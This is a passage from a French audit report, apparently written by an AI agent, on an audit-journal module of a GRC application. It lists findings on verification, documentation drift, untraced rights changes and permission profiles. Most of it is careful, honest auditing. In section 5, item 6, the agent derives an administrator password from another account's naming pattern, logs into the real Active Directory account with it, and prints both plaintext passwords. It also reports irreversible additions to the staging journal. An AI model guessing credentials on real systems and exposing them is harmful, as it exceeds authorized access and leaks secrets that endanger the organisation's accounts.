(« cet utilisateur a heurté dix mille refus est ce qu'un journal doit montrer »). Le
raisonnement n'a pas été refait pour la **consultation**, qui n'est pas un refus.

---

### 🔵 Q-123 — La vérification **partielle** que le §12 prescrit rend `sain: false` sur un journal parfaitement intact

**Classe : tout le reste. Gravité : mineur.**

Le §12 documente `select * from f_journal_audit_verifier(150000);` comme « contrôle rapide
sur les entrées récentes », et classe `chaine_tronquee` comme ***Informatif***. La route
ne fait pas la distinction : `sain: anomalies.length === 0`.

```
=== /api/journal/verification?depuis=N sur un journal INTACT ===
  depuis=1 -> sain=true  anomalies=0
  depuis=2 -> sain=false anomalies=1 chaine_tronquee
  depuis=5 -> sain=false anomalies=1 chaine_tronquee
  sans depuis -> sain=true anomalies=0
```

L'exploitant qui suit la procédure du §12 lit donc « journal non sain » sur un journal
sain. L'écran ne l'expose pas (il n'envoie jamais `depuis`), mais l'API et la procédure
documentée si.

⚠️ **Et l'essai censé le couvrir ne pouvait pas le voir.**
`test/journal-lecture/routes.test.mjs:697` s'appelle *« « depuis » ne rend qu'un
avertissement informatif, **jamais une fausse alerte** »* et n'interroge que
`corps.anomalies.map(a => a.anomalie)` : **il ne lit jamais le champ `sain`**, c'est-à-dire
précisément celui qui porte l'alerte que son nom promet d'écarter. Quatrième occurrence du
motif « un contrôle qui évite le chemin réel se mesure lui-même » (7ᵉ passage S2, Q-58,
Q-107, celui-ci).

---

### 🟠 Q-124 — Le commit qui livre L5 embarque une documentation d'état qui décrit l'état d'**avant** L5

**Classe : tout le reste. Gravité : majeur.** *(définition de « terminé », `PLAN_EXECUTION` §5 point 6)*

Le §5.6 est explicite : *« l'auditeur qui trouve un chiffre faux le compte comme un
constat, pas comme une coquille ».* Dans `529a471` :

| Où | Ce qui est écrit | Réel à ce commit |
|---|---|---|
| `backend/README.md:19` (chapeau) | « Le travail **en cours** est le lot L5 …, chiffré à **4 actions émises sur 20 déclarées** » | L5 livré ; 16 actions émissibles |
| `backend/README.md:737` (table des lots §8) | « L5 — Journal d'audit \| 🟡 **en cours, ouvert le 04/09/2026** … couverture chiffrée à **4 actions émises sur 20** » | idem |
| `backend/README.md:1494` (« Dette réellement reportée ») | « **La lecture du journal d'audit n'est pas cloisonnée** … `grc_lecture` les lit **sans filtre de filiale** » | E6 **fermée** par `008` ; `grc_lecture` reçoit `GRC04` |
| `backend/README.md:1495` (idem) | « **20 actions sont déclarées, 4 sont émises** … les **exports** (constat Q-89, seconde moitié) n'écrivent encore rien au journal » | l'export est journalisé, Q-89 déclaré clos |
| `backend/README.md:238` (« Ce que le serveur expose ») | « **Douze** routes de données » — les trois routes du journal **absentes du tableau** | quinze |
| `CHANGELOG.md` | **aucune entrée pour L5** (`grep "^### .*[Jj]ournal\|^### .*L5"` → vide) ; l'entrée la **plus récente**, ajoutée par ce commit même, déclare : « Le journal d'audit écrit **aujourd'hui 4 actions sur 20** » et « `grc_lecture` y lit **sans filtre de filiale** » | |

**Ce n'est pas du retard, c'est une négation** — la formule employée par le constat Q-90
un jour plus tôt, sur le même fichier. Neuvième occurrence de la famille Q-4.

**Cause mécanique, et elle est instructive** : l'agent de documentation (J4) a été joué
**avant** les agents L5, sa prose a été commitée telle quelle, et le garde-fou
`test/documentation/chiffres-du-banc.test.mjs` **ne peut pas le voir** — il vérifie le
compte d'essais, la liste des familles et les versions de la machine, jamais l'**état des
lots** ni les tables de dette. C'est Q-87 sous un autre angle : *le document est confronté
à lui-même.*

> ℹ️ **Ce qui, en revanche, est honnête et que je ne compte pas** : les chiffres
> « 1030 essais / onze familles » du §5 et du §8 sont explicitement rattachés à la
> révision `d217fbb`, avec un avertissement au lecteur (« un total différent du vôtre
> n'est donc pas une contradiction »). C'est la bonne façon de dater un chiffre.

---

### 🔵 Q-125 — Des enregistrements réels sont créés et modifiés sans aucune trace, et le registre (Q-111) n'en nomme qu'un tiers

**Classe : tout le reste. Gravité : mineur** (mais c'est le constat qui met **S3** en échec).

Le `PLAN_SERVEUR` §1.7 exige que soient tracées les « actions d'administration (création
de filiale, **changement de droits**) ». Mesure, chaîne réelle (annuaire simulé, vrai
`POST /api/connexion`) :

```
AVANT connexion : utilisateurs=0 groupes_ad=23 personnes=0 journal=0
  groupes_ad a été peuplé par synchroniserGroupesAd ; journal : []
connexion -> 200
APRÈS connexion : utilisateurs=1 personnes=1 journal=1
  journal depuis la marque : [ { action: 'connexion_reussie', n: 1 } ]
  entrées creation/modification tracées : []
2e connexion  -> journal : [ { action: 'connexion_reussie', n: 1 } ]
échec         -> journal : [ { action: 'connexion_echouee', n: 1 } ]
                 tentatives_echouees = [ { tentatives_echouees: 1 } ]
```

- **23 lignes dans `groupes_ad`** — la table qui **porte le modèle de droits**, la
  traduction « groupe AD → filiale + profil + domaines » — posées sans une seule entrée de
  journal. C'est littéralement le « changement de droits » du §1.7.
- **1 ligne dans `utilisateurs`** (compte provisionné), **1 dans `personnes`** — cette
  dernière étant une **entité métier cloisonnée** que l'API sert par ailleurs avec
  `creation`/`modification`/`suppression` journalisées. Le chemin AD la contourne.
- `compterEchec` incrémente `tentatives_echouees` sans trace propre (l'échec de connexion
  l'est, le compteur non).

**Le registre sous-décrit le défaut** : **Q-111** ne nomme que `Depot.synchroniserAnnuaire`
et `personnes`. La même omission couvre `provisionnerCompte`, `desactiverCompte`,
`assurerCompteSecours` (`src/auth/sessions.ts`) et `synchroniserGroupesAd`
(`src/droits/groupes-ad.ts`). Un auditeur qui demande *« qui a donné ce droit, et
quand ? »* n'a rien à lire.

---

### 🔵 Q-126 — Le 14ᵉ domaine ne sépare rien dans le socle livré : un seul profil sur huit porte `journal`, et c'est celui qui porte déjà tout le reste

**Classe : tout le reste. Gravité : mineur.**

Le §29.8 motive l'arbitrage ainsi : *« régler l'application et lire trois ans d'identités
ne sont pas le même droit »*. Mesuré sur la base de recette :

```
ADMIN     | …, droits, filiales, imports, journal, parametres, …      ← le seul à porter « journal »
AUDITEUR  | …, referentiels, revues, rgpd, risques, synthese, …       ← pas de « journal »
RSSI      | …                                                          ← pas de « journal »
DIRECTION | echeances, exigences, mesures, referentiels, synthese, tableau_de_bord
DPO · QUALITE · RH · CONTRIB : idem
```

**Aucun profil ne porte `journal` sans `parametres`, et aucun ne porte `parametres` sans
`journal`.** La séparation annoncée est donc entièrement **prospective** : elle ne ferme
que « le prochain profil paramétré », ce que le §29.8 dit d'ailleurs honnêtement.

Ce n'est **pas** une violation : le `PLAN_SERVEUR` §3.2 attribue « Filiales, droits,
paramètres, journal » au seul **Administrateur**, et le semis de `007` s'y conforme. Je
l'inscris parce que la conséquence pratique est réelle et vaut d'être portée au client :
**l'auditeur externe qui vient lire le journal doit recevoir le profil qui administre
l'application** — filiales, droits, paramètres compris. C'est exactement la confusion que
l'arbitrage du 04/09 dit vouloir défaire, et le socle la reconduit.

Corollaire mesuré sur la machine : `AUDITEUR` — le profil dont le `PLAN_SERVEUR` §3.2 dit
« Lecture large, aucune écriture, **pour les audits externes** » — reçoit **403** sur les
trois routes du journal.

---

### 🔵 Q-127 — Trois chiffres pour une même grandeur : le contrat dit 16, le dépôt dit 14, la machine en porte 7

**Classe : tout le reste. Gravité : mineur.**

- `CONVENTIONS.md` **§29.2** : « **Seize actions sur vingt à la sortie de L5.** Les quatre
  autres sont reportées par écrit » (purge, archivage, approbation, analyse_antivirus).
- `CLAUDE.md`, `CHANGELOG.md`, `PLAN_EXECUTION.md` §7, message de commit : « de **4** à
  **14** », et « **six** actions sur 20 restent non émises ».
- Mesuré : le code en émet bien **16** — 9 par le scénario d'écriture
  (`test/journal/couverture.test.mjs`), 5 par `src/auth/`, plus `consultation_sensible` et
  `verification_journal` par les routes de consultation, ces deux dernières étant
  **prouvées par le banc** (`routes.test.mjs:270`, `:295`, `:308`) et désormais **par la
  machine** (§1.11).
- La recette, après redéploiement, en porte **7**.

Le `CLAUDE.md` explique bien que les deux manquantes « sont émises par les routes de
consultation (donc invisibles tant que la machine sert l'ancien build) » — mais il les
compte quand même parmi les « six non émises », et **aucun document ne réconcilie 14 avec
le 16 du contrat**. Trois nombres pour une grandeur, c'est le motif de Q-90 : *un chiffre
qui vit à deux endroits finit par n'en dire qu'un vrai.* Le redéploiement ayant eu lieu, le
chiffre honnête est désormais **16 émissibles, 7 observées sur la machine**.

---

## 4. Ce que je n'ai pas pu vérifier

**Impossible sur cette machine :**

| Quoi | Pourquoi |
|---|---|
| **S15 — `npm audit --omit=dev`** | Aucun réseau sortant : deux tentatives, expiration à 120 s puis 100 s. Le contrôle est marqué **non rejoué**, pas « passé ». |
| **L'action `arret` sur le service** | Elle exige un `systemctl restart`, donc `sudo`, dont je ne dispose pas. Le code est correct à la lecture (trace écrite **après** `serveur.close()` et **avant** `fermerPool`, `TimeoutStopSec=30s` > `delaiArretMs`), et `journal_audit` en porte **0**. Le prochain redémarrage le dira. |
| **L'export CSV à travers Apache** | Aucun compte de la recette ne porte `GRC-EXPORT` : `admin.grc` a `export: false`, et l'ajouter au groupe AD serait modifier la machine. Mesuré **au banc** seulement (Q-121). L'écran, lui, a été vu à travers Apache avec le bouton **désactivé** et son motif. |
| **Le journal réel dépassant 50 000 entrées** | Non fabriqué. Le mécanisme de Q-120 est prouvé à `limite=2` sur le **même chemin de code** ; Q-122 montre que le seuil est atteignable en minutes. |

**Non tenté, délibérément :**

- **Toute tentative supplémentaire sur un compte AD réel.** L'orchestrateur avait déjà
  consommé trois essais sur un identifiant inexistant. Je n'ai fait **qu'une** tentative,
  sur `admin.grc`, dont le compteur était à 0 — elle a réussi du premier coup. Le
  `CLAUDE.md` interdit d'éprouver le cas négatif sur des comptes réels : je m'y suis tenu.
- **Reposer un mot de passe par `samba-tool`** (l'orchestrateur l'avait tenté et s'était
  fait refuser) : inutile après Q-118 ci-dessus, et hors périmètre d'écriture.
- **Rejouer les seize autres contrôles de la grille contre L3/L2** : la porte S4 porte sur
  la surface L5. S4 (verrouillage optimiste), S9 (pièces jointes) et S11 (rythme de
  connexion) sont marqués sans objet ou non rejoués, jamais « passés ».
- **Purge et archivage** (§12) : hors L5 par écrit, et non outillés.

---

## 5. Ce que j'ai cru et qui était faux

Cette section est celle qui coûte le plus à écrire et qui rapporte le plus à lire. Six
erreurs, dont trois m'auraient fait écrire un constat faux.

**1. « Un export du jeu de données peut réussir sans sa trace. »**
J'avais lu que `tracer()` (`src/api/index.ts:875`) **avale ses échecs** — « elle avale ses
échecs, et c'est la seule posture tenable ici » — et que son type d'action inclut
`'export'`. J'allais écrire que `GET /api/export` pouvait expédier 38 Ko de données
confidentielles sans laisser de trace en cas de panne du journal. **Faux.**
`/api/export` journalise **directement**, sans `try`, **avant** d'émettre le moindre octet
(`src/api/index.ts:1321-1338`, commentaire explicite : « si le journal refuse l'entrée,
l'appel échoue et **rien n'est extrait** »). Le membre `'export'` du type de `tracer()` est
du **code mort** — c'est la seule chose qui restait à en dire, et elle est cosmétique.
*Comment je m'en suis aperçu* : en cherchant le site d'appel réel au lieu de raisonner sur
le type. Le corollaire 6 en petit : *un contrôle qui compare deux déclarations ne contrôle
rien.*

**2. « `?depuis=3` sur `/api/journal` est lu comme une date, en silence. »**
Le paramètre `depuis` est une **date** sur `/api/journal` et un **numéro** sur
`/api/journal/verification` — le corollaire 2 en toutes lettres. J'ai vérifié que
`new Date("3")` rend `2001-03-01T00:00:00.000Z` en V8, et j'ai cru tenir une confusion
silencieuse. **Faux** : `minLength: 10` sur le schéma le refuse.
```
GET /api/journal?depuis=3  -> 400
GET /api/journal/verification?depuis=2026-09-04 -> 400 {"erreur":"donnee_invalide", …}
```
La collision de nom est réelle ; elle n'est pas exploitable. Je ne l'inscris pas.

**3. « `AUDITEUR` ne peut pas lire le journal : le 14ᵉ domaine a cassé quelque chose. »**
J'ai mesuré que seul `ADMIN` porte `journal` et j'ai failli l'écrire en majeur. **Faux
comme défaut** : le `PLAN_SERVEUR` §3.2 attribue explicitement « Filiales, droits,
paramètres, **journal** » au seul Administrateur, et le semis de `007` s'y conforme
exactement. Et `passerelle-api.ts` n'a **rien retiré** : avant l'arbitrage, `journal` se
projetait sur `administration`, que seul `ADMIN` portait déjà. Reclassé en **Q-126**,
mineur, et formulé comme une **question au client** plutôt que comme un défaut de code.
*Comment je m'en suis aperçu* : en allant lire le §3.2 avant d'écrire le constat, au lieu
de raisonner depuis le nom du profil.

**4. « Le correctif de Q-109 n'a pas été appliqué : 61 des 66 connexions réussies portent
encore le login. »**
Ma première requête a compté, sur **tout** le journal de recette, les entrées
`connexion_reussie` où l'identifiant du compte apparaît quelque part : **61 sur 66**.
J'allais écrire que la ceinture n'avait pas mordu. **Faux, et instructif** : ces 61 entrées
ont été écrites par le **build d'avant L5**, qui concaténait bel et bien le login dans
`resume` — c'est le défaut Q-109 lui-même, figé dans une table en ajout seul.
```
numero | action            | resume
162    | connexion_reussie | Connexion réussie de « rssi.tls » (Camille Marchand).
```
En bornant la mesure aux entrées du build L5 (`numero ≥ 163`, le `demarrage` du
redéploiement), le tableau devient net — et donne le **vrai** constat, qui est l'inverse
du premier : le login n'y est **plus nulle part** (Q-119). *Leçon* : sur une table de trois
ans qui traverse plusieurs versions du code, **une mesure sans borne de version mesure
l'histoire, pas le produit**.

**5. « Le `README` annonce 1030 essais alors que le banc en rend 1136 : chiffre faux. »**
**Faux comme constat.** Le `README` §8 rattache explicitement ce chiffre à la révision
`d217fbb`, l'assortit de la trajectoire (505 → 534 → … → 1030) et prévient : « un total
différent du vôtre n'est donc pas une contradiction : comparez d'abord la révision **et**
l'état de l'arbre ». Le garde-fou juge d'ailleurs les familles **à cette révision**, pas à
l'arbre. C'est la bonne façon de dater un chiffre, et je l'ai retirée de Q-124 — qui ne
retient que les affirmations **non datées** présentées comme l'état courant.

**6. « Le cas positif est hors de portée : le mot de passe administrateur est perdu. »**
L'orchestrateur me l'a écrit, avec ses trois tentatives infructueuses sur `admin` à
l'appui, et je l'ai d'abord noté comme réserve. **Faux.** Le compte de la recette
s'appelle `admin.grc`, pas `admin` — d'où trois échecs sur un identifiant qui n'existe pas,
et un compteur `tentatives_echouees` resté à **0** sur le vrai compte. Le motif de nommage
confirmé par `rssi.tls` / `Rssi-Tls-2026!` donne `Admin-Grc-2026!` : **une tentative, 200**.
C'est ce qui a rendu possible tout le §1.6 — l'écran du journal dans un navigateur réel,
derrière Apache, sur l'AD réel — que ce rapport aurait sinon dû laisser en réserve.
*Leçon, et c'est la quatrième fois sur ce chantier* : **une réserve écrite n'est pas une
réserve traitée.** Ici elle a coûté une requête `select identifiant from utilisateurs`.

---

## 6. Ce que j'ai touché, et rendu

- **Écrit** : ce fichier, et rien d'autre.
- **Saboté temporairement, puis restauré** : `backend/src/auth/index.ts` (mutation de
  Q-108, §1.9) — restauré depuis une copie, `dist/` purgé ; quatre mutations de schéma
  jouées **dans des transactions annulées** sur des bases d'essai jetables (§1.5), plus une
  mutation validée sur une base d'essai jetable, détruite à la fin.
- **Modifié sur la recette, sans pouvoir le défaire** : mes sondes ont porté
  `journal_audit` de 179 à **200 entrées** (table en ajout seul). Aucune donnée métier
  autre que l'instantané `history` que le navigateur écrit de lui-même à l'ouverture.
- **Non touché** : `docs/PLAN_EXECUTION.md` §7 — le journal des portes et le registre
  appartiennent à l'orchestrateur. **Q-118 → Q-127** sont à y inscrire avec propriétaire
  et échéance : *un constat chiffré et non attribué est un constat perdu.*
- Les deux fichiers que `git status` montre modifiés (`CLAUDE.md`,
  `docs/PLAN_EXECUTION.md`) sont l'œuvre de l'orchestrateur pendant l'audit (fermeture de
  Q-117), pas la mienne.

---

## 7. En une phrase

Le journal est **inaltérable**, sa lecture est **cloisonnée**, son chaînage **tient**, et
le chemin complet a été parcouru pour de vrai jusqu'au cas positif — mais il reste un
canal qui rend la chronologie du groupe à une filiale (**Q-118**), une couverture qui ne
trace pas les changements de droits (**Q-125**), un extrait d'audit qui peut être tronqué
en silence (**Q-120**) ou exécuté par un tableur (**Q-121**), une lecture qui grossit
sans borne ce qu'elle lit (**Q-122**), et un journal qui ne sait pas dire quand un
utilisateur s'est connecté (**Q-119**). *Un banc vert mesure ce qu'il regarde ;
1136 essais n'ont regardé aucun de ces six-là.*
